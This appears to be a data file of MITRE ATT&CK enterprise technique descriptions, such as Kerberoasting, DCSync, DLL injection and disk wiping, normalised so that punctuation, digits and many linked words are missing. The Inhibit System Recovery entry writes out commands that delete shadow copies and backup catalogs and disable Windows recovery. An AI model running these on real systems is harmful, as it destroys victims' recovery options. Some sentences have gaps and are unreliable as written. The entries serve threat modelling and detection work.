attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5,['enterprise-attack'],['T1602.001'],SNMP (MIB Dump),adversaries may target the management information base  mib  to collect and or mine valuable information in a network managed using simple network management protocol  snmp _  the mib is a configuration repository that stores variable information accessible via snmp in the form of object identifiers  oid   each oid identifies a variable that can be read or set and permits active management tasks  such as configuration changes  through remote modification of these variables  snmp can give administrators great insight in their systems  such as  system information  description of hardware  physical location  and software packages citation  sans information security reading room securing snmp securing snmp   the mib may also contain device operational information  including running configuration  routing table  and interface details_  adversaries may use snmp queries to collect mib content directly from snmp managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation_ citation  cisco blog legacy device attacks 
attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235,['enterprise-attack'],['T1001.002'],Steganography,adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult  steganographic techniques can be used to hide data in digital messages that are transferred between systems  this hidden information can be used for command and control of compromised systems  in some cases  the passing of files embedded using steganography  such as image or document files  can be used for command and control 
attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9,['enterprise-attack'],['T1204.001'],Malicious Link,an adversary may rely upon a user clicking a malicious link in order to gain execution  users may be subjected to social engineering to get them to click on a link that will lead to code execution  this user action will typically be observed as follow on behavior from  spearphishing  clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via  exploitation for client  links may also lead users to download files that require execution via  malicious
attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51,['enterprise-attack'],['T1550.001'],Application Access Token,adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts  information  or services on remote systems  these tokens are typically stolen from users or services and used in lieu of login credentials_  application access tokens are used to make authorized api requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container based applications and software as a service  saas _ citation  auth    why you should always use access tokens to secure apis sept         in aws and gcp environments  adversaries can trigger a request for a short lived access token with the privileges of another user account_ citation  google cloud service account credentials  citation  aws temporary security credentials  the adversary can then use this token to request data or perform actions the original account could not  if permissions for this feature are misconfigured   for example  by allowing all users to request a token for a particular account   an adversary may be able to gain initial access to a cloud account or escalate their privileges_ citation  rhino security labs enumerating aws roles   oauth is one commonly implemented framework that issues tokens to users for access to systems  these frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform  once identity is established  the token allows actions to be authorized  without passing the actual credentials of the user  therefore  compromise of the token can grant the adversary access to resources of other sites through a malicious application_  for example  with a cloud based email service once an oauth access token is granted to a malicious application  it can potentially gain long term access to features of the user account if a  refresh  token enabling background access is awarded_ citation  microsoft identity platform access       with an oauth access token an adversary can use the user granted rest api to perform functions such as email searching and contact enumeration_ citation  staaldraad phishing with oauth        compromised access tokens may be used as an initial step in compromising other services  for example  if a token grants access to a victim s primary email  the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines  direct api access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords  access abuse over an api channel can be difficult to detect even from the service provider end  as the access can still align well with a legitimate workflow 
attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4,['enterprise-attack'],['T1547.008'],LSASS Driver,adversaries may modify or add lsass drivers to obtain persistence on compromised systems  the windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain  the local security authority  lsa  is the main component responsible for local security policy and user authentication  the lsa includes multiple dynamic link libraries  dlls  associated with various other security functions  all of which run in the context of the lsa subsystem service  lsass  lsass_exe process_ citation  microsoft security subsystem   adversaries may target lsass drivers to obtain persistence  by either replacing or adding illegitimate drivers  e_g_   hijack execution  an adversary can use lsa operations to continuously execute malicious payloads 
attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4,['enterprise-attack'],['T1569.002'],Service Execution,adversaries may abuse the windows service control manager to execute malicious commands or payloads  the windows service control manager  services_exe  is an interface to manage and manipulate services_ citation  microsoft service control manager  the service control manager is accessible to users via gui components as well as system utilities such as sc_exe and    can also be used to execute commands or payloads via a temporary windows service created through the service control manager api_ citation  russinovich sysinternals  tools such as  and sc_exe can accept remote servers as arguments and may be used to conduct remote execution_  adversaries may leverage these mechanisms to execute malicious content  this can be done by either executing a new or modified service  this technique is the execution used in conjunction with  windows  during service persistence or privilege escalation 
attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65,['enterprise-attack'],['T1078.004'],Cloud Accounts,adversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access  persistence  privilege escalation  or defense evasion  cloud accounts are those created and configured by an organization for use by users  remote support  services  or for administration of resources within a cloud service provider or saas application  in some cases  cloud accounts may be federated with traditional identity management system  such as window active directory_ citation  aws identity federation  citation  google federating gc  citation  microsoft deploying ad federation   compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases  access to cloud accounts can also be abused to gain initial access to a network by abusing a  trusted  similar to  domain  compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment_  once a cloud account is compromised  an adversary may perform  account    for example  by adding  additional cloud    to maintain persistence and potentially escalate their privileges 
attack-pattern--f244b8dd-af6c-4391-a497-fc03627ce995,['enterprise-attack'],['T1480.001'],Environmental Keying,adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment  environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target  environmental keying is an implementation of  execution  that utilizes cryptographic techniques for deriving encryption decryption keys from specific types of values in a given computing environment_ citation  ek clueless agents   values can be derived from target specific elements and used to generate a decryption key for an encrypted payload  target specific values can be derived from specific network shares  physical devices  software software versions  files  joined ad domains  system time  and local external ip addresses_ citation  kaspersky gauss whitepaper  citation  proofpoint router malvertising  citation  ek impeding malware analysis  citation  environmental keyed hta  citation  ebowla  genetic malware  by generating the decryption keys from target specific environmental values  environmental keying can make sandbox detection  anti virus detection  crowdsourcing of information  and reverse engineering difficult_ citation  kaspersky gauss whitepaper  citation  ebowla  genetic malware  these difficulties can slow down the incident response process and help adversaries hide their tactics  techniques  and procedures  ttps _  similar to  obfuscated files or  adversaries may use environmental keying to help protect their ttps and evade detection  environmental keying may be used to deliver an encrypted payload to the target that will use target specific values to decrypt the payload before execution_ citation  kaspersky gauss whitepaper  citation  ek impeding malware analysis  citation  environmental keyed hta  citation  ebowla  genetic malware  citation  demiguise guardrail router logo  by utilizing target specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection  depending on the technique for gathering target specific values  reverse engineering of the encrypted payload can be exceptionally difficult_ citation  kaspersky gauss whitepaper  this can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within_  like other  execution  environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within  this activity is distinct from typical  virtualization sandbox  while use of  virtualization sandbox  may involve checking for known sandbox values and continuing with execution only if there is no match  the use of environmental keying will involve checking for an expected target specific value that must match for decryption and subsequent execution to be successful 
attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433,['enterprise-attack'],['T1008'],Fallback Channels,adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds 
attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5,['enterprise-attack'],['T1564.004'],NTFS File Attributes,adversaries may use ntfs file attributes to hide their malicious data in order to evade detection  every new technology file system  ntfs  formatted partition contains a master file table  mft  that maintains a record for every file directory on the partition   citation  spectorops host based jul       within mft entries are file attributes   citation  microsoft ntfs file attributes aug       such as extended attributes  ea  and data  known as alternate data streams  adss  when more than one data attribute is present   that can be used to store arbitrary data  and even complete files    citation  spectorops host based jul        citation  microsoft file streams   citation  malwarebytes ads july        citation  microsoft ads mar        adversaries may store malicious data or binaries in file attribute metadata instead of directly in files  this may be done to evade some defenses  such as static indicator scanning tools and anti virus   citation  journey into ir zeroaccess ntfs ea   citation  malwarebytes ads july      
attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee,['enterprise-attack'],['T1558.003'],Kerberoasting,adversaries may abuse a valid kerberos ticket granting ticket  tgt  or sniff network traffic to obtain a ticket granting service  tgs  ticket that may be vulnerable to  brute  empire invokekerberoast oct       citation  adsecurity cracking kerberos dec         service principal names  spns  are used to uniquely identify each instance of a windows service  to enable authentication  kerberos requires that spns be associated with at least one service logon account  an account specifically tasked with running a service citation  microsoft detecting kerberoasting feb       _ citation  microsoft spn  citation  microsoft setspn  citation  sans attacking kerberos nov       citation  harmj y kerberoast nov        adversaries possessing a valid kerberos ticket granting ticket  tgt  may request one or more kerberos ticket granting service  tgs  service tickets for any spn from a domain controller  dc _ citation  empire invokekerberoast oct       citation  adsecurity cracking kerberos dec       portions of these tickets may be encrypted with the rc  algorithm  meaning the kerberos   tgs rep etype    hash of the service account associated with the spn is used as the private key and is thus vulnerable to offline  brute  attacks that may expose plaintext credentials_ citation  adsecurity cracking kerberos dec       citation  empire invokekerberoast oct        citation  harmj y kerberoast nov        this same behavior could be executed using service tickets captured from network traffic_ citation  adsecurity cracking kerberos dec        cracked hashes may enable   privilege  and  lateral  via access to  valid  sans attacking kerberos nov      
attack-pattern--f2d44246-91f1-478a-b6c8-1227e0ca109d,['enterprise-attack'],['T1096'],NTFS File Attributes,every new technology file system  ntfs  formatted partition contains a master file table  mft  that maintains a record for every file directory on the partition   citation  spectorops host based jul       within mft entries are file attributes   citation  microsoft ntfs file attributes aug       such as extended attributes  ea  and data  known as alternate data streams  adss  when more than one data attribute is present   that can be used to store arbitrary data  and even complete files    citation  spectorops host based jul        citation  microsoft file streams   citation  malwarebytes ads july        citation  microsoft ads mar        adversaries may store malicious data or binaries in file attribute metadata instead of directly in files  this may be done to evade some defenses  such as static indicator scanning tools and anti virus   citation  journey into ir zeroaccess ntfs ea   citation  malwarebytes ads july      
attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163,['enterprise-attack'],['T1003.006'],DCSync,adversaries may attempt to access credentials and other sensitive information by abusing a windows domain controller's application programming interface  api  citation  microsoft drsr dec        citation  microsoft getnccchanges   citation  samba drsuapi   citation  wine api samlib_dll  to simulate the replication process from a remote domain controller using a technique called dcsync_  members of the administrators  domain admins  and enterprise admin groups or computer accounts on the domain controller are able to run dcsync to pull password data citation  adsecurity mimikatz dcsync  from active directory  which may include current and historical hashes of potentially useful accounts such as krbtgt and administrators  the hashes can then in turn be used to create a  golden  for use in  pass the  harmj y mimikatz and dcsync  or change an account's password as noted in  account  insiderthreat changentlm july        dcsync functionality has been included in the  lsadump  module in  github mimikatz lsadump module  lsadump also includes netsync  which performs dcsync over a legacy replication protocol_ citation  microsoft nrpc dec      
attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077,['enterprise-attack'],['T1124'],System Time Discovery,an adversary may gather the system time and or time zone from a local or remote system  the system time is set and stored by the windows time service within a domain to maintain time synchronization between systems and services in an enterprise network   citation  msdn system time   citation  technet windows time service   system time information may be gathered in a number of ways  such as with  on windows by performing net time   hostname to gather the system time on a remote system  the victim's time zone may also be inferred from the current system time or gathered by using w  tm  tz   citation  technet windows time service   this information could be useful for performing other techniques  such as executing a file with a  scheduled   citation  rsa eu   they're inside   or to discover locality information based on time zone to assist in victim targeting  i_e   system location  adversaries may also use knowledge of system time as part of a time bomb  or delaying execution until a specified date time_ citation  anyrun timebomb 
attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0,['enterprise-attack'],['T1053.002'],At,adversaries may abuse the  utility to perform task scheduling for initial or recurring execution of malicious code  the  utility exists as an executable within windows  linux  and macos for scheduling tasks at a specified time and date  although deprecated in favor of  scheduled   in windows environments  using  requires that the task scheduler service be running  and the user to be logged on as a member of the local administrators group_  on linux and macos   may be invoked by the superuser as well as any users added to the at_allow file  if the at_allow file does not exist  the at_deny file is checked  every username not listed in at_deny is allowed to invoke  if the at_deny exists and is empty  global use of  is permitted  if neither file exists  which is often the baseline  only the superuser is allowed to use  linux at   adversaries may use  to execute programs at system startup or on a scheduled basis for   can also be abused to conduct remote  as part of  lateral  and or to run a process under the context of a specified account  such as system _  in linux environments  adversaries may also abuse  to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands  similarly   may also be used for  privilege  if the binary is allowed to run as superuser via sudo_ citation  gtfobins at 
attack-pattern--f44731de-ea9f-406d-9b83-30ecbb9b4392,['enterprise-attack'],['T1035'],Service Execution,adversaries may execute a binary  command  or script via a method that interacts with windows services  such as the service control manager  this can be done by either creating a new service or modifying an existing service  this technique is the execution used in conjunction with  new  and  modify existing  during service persistence or privilege escalation 
attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945,['enterprise-attack'],['T1055.001'],Dynamic-link Library Injection,adversaries may inject dynamic link libraries  dlls  into processes in order to evade process based defenses as well as possibly elevate privileges  dll injection is a method of executing arbitrary code in the address space of a separate live process     dll injection is commonly performed by writing the path to a dll in the virtual address space of the target process before loading the dll by invoking a new thread  the write can be performed with native windows api calls such as virtualallocex and writeprocessmemory  then invoked with createremotethread  which calls the loadlibrary api responsible for loading the dll    citation  elastic process injection july         variations of this method such as reflective dll injection  writing a self mapping dll into a process  and memory module  map dll when writing into process  overcome the address relocation issue as well as the additional apis to invoke execution  since these methods load and execute the files in memory by manually preforming the function of loadlibrary _ citation  elastic huntingnmemory june       citation  elastic process injection july         another variation of this method  often referred to as module stomping overloading or dll hollowing  may be leveraged to conceal injected code within a process  this method involves loading a legitimate dll into a remote process then manually overwriting the module's addressofentrypoint before starting a new thread in the target process_ citation  module stomping for shellcode injection  this variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate dll file on disk_ citation  hiding malicious code with module stomping    running code in the context of another process may allow access to the process's memory  system network resources  and possibly elevated privileges  execution via dll injection may also evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0,['enterprise-attack'],['T1086'],PowerShell,powershell is a powerful interactive command line interface and scripting environment included in the windows operating system   citation  technet powershell  adversaries can use powershell to perform a number of actions  including discovery of information and execution of code  examples include the start process cmdlet which can be used to run an executable and the invoke command cmdlet which runs a command locally or on a remote computer    powershell may also be used to download and run executables from the internet  which can be executed from disk or in memory without touching disk_  administrator permissions are required to use powershell to connect to remote systems_  a number of powershell based offensive testing tools are available  including   powersploit   and psattack   citation  github psattack   powershell commands scripts can also be executed without directly invoking the powershell_exe binary through interfaces to powershell's underlying system_management_automation assembly exposed through the _net framework and windows common language interface  cli    citation  sixdub powerpick jan       citation  silentbreak offensive ps dec        citation  microsoft psfromcsharp apr      
attack-pattern--f4b843c1-7e92-4701-8fed-ce82f8be2636,['enterprise-attack'],['T1588.005'],Exploits,adversaries may buy  steal  or download exploits that can be used during targeting  an exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software  rather than developing their own exploits  an adversary may find modify exploits from online or purchase them from exploit vendors_ citation  exploit database   in addition to downloading free exploits from the internet  adversaries may purchase exploits from third party entities  third party entities can include technology companies that specialize in exploit development  criminal marketplaces  including exploit kits   or from individuals_ citation  wired sandcat oct       in addition to purchasing exploits  adversaries may steal and repurpose exploits from third party entities  including other adversaries _  an adversary may monitor exploit provider forums to understand the state of existing  as well as newly discovered  exploits  there is usually a delay between when an exploit is discovered and when it is made public  an adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation_  adversaries may use exploits during various phases of the adversary lifecycle  i_e   exploit public facing   exploitation for client   exploitation for privilege   exploitation for defense   exploitation for credential   exploitation of remote  and  application or system
attack-pattern--f4c1826f-a322-41cd-9557-562100848c84,['enterprise-attack'],['T1556'],Modify Authentication Process,adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts  the authentication process is handled by mechanisms  such as the local security authentication server  lsass  process and the security accounts manager  sam  on windows  pluggable authentication modules  pam  on unix based systems  and authorization plugins on macos systems  responsible for gathering  storing  and validating credentials  by modifying an authentication process  an adversary may be able to authenticate to a service or system without using  valid   adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms  compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services  such as vpns  outlook web access and remote desktop 
attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6,['enterprise-attack'],['T1056.004'],Credential API Hooking,adversaries may hook into windows application programming interface  api  functions to collect user credentials  malicious hooking mechanisms may capture api calls that include parameters that reveal user authentication credentials_ citation  microsoft trojanspy win   ursnif_gen i sept       unlike   this technique focuses specifically on api functions that include parameters that reveal user credentials  hooking involves redirecting calls to these functions and can be implemented via       hooks procedures    which intercept and execute designated code in response to events such as messages  keystrokes  and mouse inputs_ citation  microsoft hook overview  citation  elastic process injection july           import address table  iat  hooking    which use modifications to a process s iat  where pointers to imported api functions are stored_ citation  elastic process injection july       citation  adlice software iat hooks oct       citation  mwrinfosecurity dynamic hooking           inline hooking    which overwrites the first bytes in an api function to redirect code flow_ citation  elastic process injection july       citation  hightech bridge inline hooking sept       citation  mwrinfosecurity dynamic hooking      
attack-pattern--f5bb433e-bdf6-4781-84bc-35e97e43be89,['enterprise-attack'],['T1495'],Firmware Corruption,adversaries may overwrite or corrupt the flash memory contents of system bios or other firmware in devices attached to a system in order to render them inoperable or unable to boot  thus denying the availability to use the devices and or the system_ citation  symantec chernobyl w  _cih  firmware is software that is loaded and executed from non volatile memory on hardware devices in order to initialize and manage device functionality  these devices may include the motherboard  hard drive  or video cards_  in general  adversaries may manipulate  overwrite  or corrupt firmware in order to deny the use of the system or devices  for example  corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable  depending on the device  this attack may also result in  data
attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a,['enterprise-attack'],['T1490'],Inhibit System Recovery,adversaries may delete or remove built in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery_ citation  talos olympic destroyer       citation  fireeye wannacry       this may deny access to available backups and recovery options_  operating systems may contain features that can help fix corrupted systems  such as a backup catalog  volume shadow copies  and automatic repair features  adversaries may disable or delete system recovery features to augment the effects of  data  and  data encrypted for  talos olympic destroyer       citation  fireeye wannacry        a number of native windows utilities have been used by adversaries to disable or delete system recovery features     vssadmin_exe can be used to delete all volume shadow copies on a system   vssadmin_exe delete shadows  all  quiet    windows management  can be used to delete volume shadow copies   wmic shadowcopy delete   wbadmin_exe can be used to delete the windows backup catalog   wbadmin_exe delete catalog  quiet   bcdedit_exe can be used to disable automatic windows recovery features by modifying boot configuration data   bcdedit_exe  set  default  bootstatuspolicy ignoreallfailures   bcdedit  set  default  recoveryenabled no
attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed,['enterprise-attack'],['T1546.007'],Netsh Helper DLL,adversaries may establish persistence by executing malicious content triggered by netsh helper dlls  netsh_exe  also referred to as netshell  is a command line scripting utility used to interact with the network configuration of a system  it contains functionality to add helper dlls for extending functionality of the utility_ citation  technet netsh  the paths to registered netsh_exe helper dlls are entered into the windows registry at hklm software microsoft netsh_  adversaries can use netsh_exe helper dlls to trigger execution of arbitrary code in a persistent manner  this execution would take place anytime netsh_exe is executed  which could happen automatically  with another persistence technique  or if other software  ex  vpn  is present on the system that executes netsh_exe as part of its normal functionality_ citation  github netsh helper cs beacon  citation  demaske netsh persistence 
attack-pattern--f6ad61ee-65f3-4bd0-a3f5-2f0accb36317,['enterprise-attack'],['T1566.003'],Spearphishing via Service,adversaries may send spearphishing messages via third party services in an attempt to gain access to victim systems  spearphishing via service is a specific variant of spearphishing  it is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels    all forms of spearphishing are electronically delivered social engineering targeted at a specific individual  company  or industry  in this scenario  adversaries send messages through various social media services  personal webmail  and other non enterprise controlled services  these services are more likely to have a less strict security policy than an enterprise  as with most kinds of spearphishing  the goal is to generate rapport with the target or get the target's interest in some way  adversaries will create fake social media accounts and message employees for potential job opportunities  doing so allows a plausible reason for asking about services  policies  and software that's running in an environment  the adversary can then send malicious links or attachments through these services_  a common example is to build rapport with a target via social media  then send content to a personal webmail service that the target uses on their work computer  this allows an adversary to bypass some email restrictions on the work account  and the target is more likely to open the file since it's something they were expecting  if the payload doesn't work as expected  the adversary can continue normal communications and troubleshoot with the target on how to get it working 
attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755,['enterprise-attack'],['T1090.001'],Internal Proxy,adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment  many tools exist that enable traffic redirection through proxies or port redirection  including  zxproxy  and zxportmap   citation  trend micro apt attack tools  adversaries use internal proxies to manage command and control communications inside a compromised environment  to reduce the number of simultaneous outbound network connections  to provide resiliency in the face of connection loss  or to ride over existing trusted communications paths between infected systems to avoid suspicion  internal proxy connections may use common peer to peer  p p  networking protocols  such as smb  to better blend in with the environment_  by using a compromised internal system as a proxy  adversaries may conceal the true destination of c  traffic while reducing the need for numerous connections to external systems 
attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe,['enterprise-attack'],['T1216'],System Script Proxy Execution,adversaries may use trusted scripts  often signed with certificates  to proxy the execution of malicious files  several microsoft signed scripts that have been downloaded from microsoft or are default on windows installations can be used to proxy execution of other files_ citation  lolbas project  this behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems_ citation  github ultimate applocker bypass list 
attack-pattern--f72eb8a8-cd4c-461d-a814-3f862befbf00,['enterprise-attack'],['T1094'],Custom Command and Control Protocol,adversaries may communicate using a custom command and control protocol instead of encapsulating commands data in an existing  application layer  implementations include mimicking well known protocols or developing custom protocols  including raw sockets  on top of fundamental protocols provided by tcp ip another standard network stack 
attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7,['enterprise-attack'],['T1102.001'],Dead Drop Resolver,adversaries may use an existing  legitimate external web service to host information that points to additional command and control  c   infrastructure  adversaries may post content  known as a dead drop resolver  on web services with embedded  and often obfuscated encoded  domains or ip addresses  once infected  victims will reach out to and be redirected by these resolvers_  popular websites and social media acting as a mechanism for c  may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise  using common services  such as those offered by google or twitter  makes it easier for adversaries to hide in expected noise  web service providers commonly use ssl tls encryption  giving adversaries an added level of protection_  use of a dead drop resolver may also protect back end c  infrastructure from discovery through malware binary analysis while also enabling operational resiliency  since this infrastructure may be dynamically changed  
attack-pattern--f792d02f-813d-402b-86a5-ab98cb391d3b,['enterprise-attack'],['T1118'],InstallUtil,installutil is a command line utility that allows for installation and uninstallation of resources by executing specific installer components specified in _net binaries   citation  msdn installutil  installutil is located in the _net directories on a windows system  c  windows microsoft_net framework v installutil_exe and c  windows microsoft_net framework   v installutil_exe  installutil_exe is digitally signed by microsoft_  adversaries may use installutil to proxy execution of code through a trusted windows utility  installutil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute  system_componentmodel_runinstaller true     citation  lolbas installutil 
attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade,['enterprise-attack'],['T1001.001'],Junk Data,adversaries may add junk data to protocols used for command and control to make detection more difficult  by adding random or meaningless data to the protocols used for command and control  adversaries can prevent trivial methods for decoding  deciphering  or otherwise analyzing the traffic  examples may include appending prepending data with junk characters or writing junk characters between significant characters 
attack-pattern--f870408c-b1cd-49c7-a5c7-0ef0fc496cc6,['enterprise-attack'],['T1598.001'],Spearphishing Service,adversaries may send spearphishing messages via third party services to elicit sensitive information that can be used during targeting  spearphishing for information is an attempt to trick targets into divulging information  frequently credentials or other actionable information  spearphishing for information frequently involves social engineering techniques  such as posing as a source with a reason to collect information  ex   establish  or  compromise  and or sending multiple  seemingly urgent messages_  all forms of spearphishing are electronically delivered social engineering targeted at a specific individual  company  or industry  in this scenario  adversaries send messages through various social media services  personal webmail  and other non enterprise controlled services_ citation  threatpost social media phishing  these services are more likely to have a less strict security policy than an enterprise  as with most kinds of spearphishing  the goal is to generate rapport with the target or get the target's interest in some way  adversaries may create fake social media accounts and message employees for potential job opportunities  doing so allows a plausible reason for asking about services  policies  and information about their environment  adversaries may also use information from previous reconnaissance efforts  ex   social  or  search victim owned  to craft persuasive and believable lures 
attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e,['enterprise-attack'],['T1043'],Commonly Used Port,  this technique has been deprecated  please use  non standard  where appropriate_    adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection  they may use commonly open ports such as    tcp     http    tcp      https    tcp     smtp    tcp udp     dns   they may use the protocol associated with the port or a completely different protocol    for connections that occur internally within an enclave  such as those between a proxy or pivot node and other nodes   examples of common ports are     tcp udp      rpc    tcp udp     ssh    tcp udp       rdp 
attack-pattern--f8ef3a62-3f44-40a4-abca-761ab235c436,['enterprise-attack'],['T1552.007'],Container API,adversaries may gather credentials via apis within a containers environment  apis in these environments  such as the docker api and kubernetes apis  allow a user to remotely manage their container resources and cluster components_ citation  docker api  citation  kubernetes api   an adversary may access the docker api to collect logs that contain credentials to cloud  container  and various other resources in the environment_ citation  unit    unsecured docker daemons  an adversary with sufficient permissions  such as via a pod's service account  may also use the kubernetes api to retrieve credentials from the kubernetes api server  these credentials may include those needed for docker api authentication or secrets from kubernetes cluster components 
attack-pattern--f9cc4d06-775f-4ee1-b401-4e2cc0da30ba,['enterprise-attack'],['T1584.001'],Domains,adversaries may hijack domains and or subdomains that can be used during targeting  domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant  adversaries may gain access to an email account for the person listed as the owner of the domain  the adversary can then claim that they forgot their password in order to make changes to the domain registration  other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps_ citation  krebs dns hijack        subdomain hijacking can occur when organizations have dns entries that point to non existent or deprovisioned resources  in such cases  an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain_ citation  microsoft sub takeover      
attack-pattern--f9e9365a-9ca2-4d9c-8e7c-050d73d1101a,['enterprise-attack'],['T1505.001'],SQL Stored Procedures,adversaries may abuse sql stored procedures to establish persistent access to systems  sql stored procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used sql queries  stored procedures can be invoked via sql statements to the database using the procedure name or via defined events  e_g  when a sql server application is started restarted _  adversaries may craft malicious stored procedures that can provide a persistence mechanism in sql database servers_ citation  netspi startup stored procedures  citation  kaspersky mssql aug       to execute operating system commands through sql syntax the adversary may have to enable additional functionality  such as xp_cmdshell for mssql server_ citation  netspi startup stored procedures  citation  kaspersky mssql aug       citation  microsoft xp_cmdshell         microsoft sql server can enable common language runtime  clr  integration  with clr integration enabled  application developers can write stored procedures using any _net framework language  e_g  vb _net  c   etc_ _ citation  microsoft clr integration       adversaries may craft or modify clr assemblies that are linked to stored procedures since these clr assemblies can be made to execute arbitrary commands_ citation  netspi sql server clr 
attack-pattern--fa44a152-ac48-441e-a524-dd7b04b8adcd,['enterprise-attack'],['T1556.004'],Network Device Authentication,adversaries may use  patch system  to hard code a password in the operating system  thus bypassing of native authentication mechanisms for local accounts on network devices_   modify system  may include implanted code to the operating system for network devices to provide access for adversaries using a specific password   the modification includes a specific password which is implanted in the operating system image via the patch   upon authentication attempts  the inserted code will first check to see if the user input is the password  if so  access is granted  otherwise  the implanted code will pass the credentials on for verification of potentially valid credentials_ citation  mandiant   synful knock 
attack-pattern--fb640c43-aa6b-431e-a961-a279010424ac,['enterprise-attack'],['T1561.001'],Disk Content Wipe,adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources_  adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface_ citation  novetta blockbuster  citation  novetta blockbuster destructive malware  citation  doj lazarus sony       instead of wiping specific disk structures or files  adversaries with destructive intent may wipe arbitrary portions of disk content  to wipe disk content  adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data_ citation  novetta blockbuster destructive malware  adversaries have been observed leveraging third party drivers like  to directly access disk content_ citation  novetta blockbuster  citation  novetta blockbuster destructive malware  this behavior is distinct from  data  because sections of the disk are erased instead of individual files_  to maximize impact on the target organization in operations where network wide availability interruption is the goal  malware used for wiping disk content may have worm like features to propagate across a network by leveraging additional techniques like  valid   os credential  and  smb windows admin  novetta blockbuster destructive malware 
attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b,['enterprise-attack'],['T1048.003'],Exfiltration Over Unencrypted Non-C2 Protocol,adversaries may steal data by exfiltrating it over an un encrypted network protocol other than that of the existing command and control channel  the data may also be sent to an alternate network location from the main command and control server    adversaries may opt to obfuscate this data  without the use of encryption  within network protocols that are natively unencrypted  such as http  ftp  or dns   this may include custom or publicly available encoding compression algorithms  such as base    as well as embedding data within protocol headers and fields 
attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490,['enterprise-attack'],['T1574.004'],Dylib Hijacking,adversaries may execute their own payloads by placing a malicious dynamic library  dylib  with an expected name in a path a victim application searches at runtime  the dynamic loader will try to find the dylibs based on the sequential order of the search paths  paths to dylibs may be prefixed with  rpath  which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable   additionally  if weak linking is used  such as the lc_load_weak_dylib function  an application will still execute even if an expected dylib is not present  weak linking enables developers to run an application on multiple macos versions as new apis are added_  adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path_ citation  wardle dylib hijack vulnerable apps  citation  wardle dylib hijacking osx       citation  github empireproject hijackscanner  citation  github empireproject createhijacker dylib  dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources  based on the application  this could result in privilege escalation and uninhibited network access  this method may also evade detection from security products since the execution is masked under a legitimate process_ citation  writing bad malware for osx  citation  wardle artofmalware volume   citation  malwareunicorn macos dylib injection macho 
